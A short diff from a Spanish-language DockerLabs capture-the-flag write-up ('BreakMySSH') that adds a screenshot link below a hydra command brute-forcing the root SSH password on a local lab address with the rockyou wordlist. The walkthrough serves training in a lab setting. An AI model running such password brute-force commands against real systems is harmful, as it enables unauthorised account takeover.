@@ -35,7 +35,7 @@ Para ello utilizaremos la herramienta `hydra`.
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
-
+![BMS_3](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_3.jpg)  
 
 
 
